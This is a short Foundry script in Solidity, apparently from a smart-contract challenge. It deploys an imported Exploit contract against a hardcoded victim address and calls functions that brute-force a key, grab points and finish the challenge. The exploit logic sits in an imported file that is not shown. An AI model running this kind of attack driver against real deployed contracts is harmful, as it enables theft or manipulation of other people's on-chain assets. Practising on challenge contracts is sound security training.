
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Script.sol";
import {Exploit, ChallengeTwo} from "../src/ChallengeTwo.sol";

contract MalScript is Script {

    Exploit public exploit;
    address victim = 0x8D6B11D53A4CE78658d8335EafAa1e77A2FB101d;

    function run() external {
        vm.startBroadcast();

        exploit = new Exploit(victim);
        
        exploit.bruteForceKey();

        exploit.malGetPoints();
        
        exploit.malFinish();

        vm.stopBroadcast();

        // string[] memory names = ChallengeTwo(victim).getAllwiners();   
        // for (uint i = 0; i < names.length; i++) {
        //     console.log(names[i]);
        // }
    }

    
}